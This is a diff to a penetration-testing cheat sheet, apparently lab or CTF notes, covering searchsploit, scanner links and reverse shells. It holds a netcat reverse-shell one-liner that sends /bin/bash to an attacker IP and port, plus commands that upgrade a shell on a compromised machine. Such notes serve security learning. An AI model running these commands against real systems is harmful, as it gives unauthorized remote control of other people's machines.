@@ -10,12 +10,20 @@
 - [CVE Metre](https://cve.mitre.org/)
 - [CVE details](https://cvedetails.com)
 
-## `searchsploit`
+### `searchsploit`
 
 ```bash
 searchsploit <target technology name>
 searchsploit fuel cms
 ```
+
+## Scanners
+
+[nikto](../../tools/Nikto/README.md)
+
+## Enumerations
+
+[gobuster](../../tools/Gobuster/README.MD)
 
 ## Reverse shell
 
@@ -29,11 +37,14 @@ nc <ip> <port> -e /bin/bash     # in compromised machine
 # nc 10.8.215.27 1234 -e /bin/bash
 ```
 
-### `python`
+- **`python`**
+  - `python -c 'import pty;pty.spawn("/bin/bash")'` in compromised machine after getting nc shell
+- **`script`**
+  - `/usr/bin/script -qc /bin/bash /dev/null`
 
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")' # in compromised machine after getting nc shell
-```
+## Reverse shell stabilization
+
+[netsec](https://netsec.ws/?p=337)
 
 ### `stty`
 
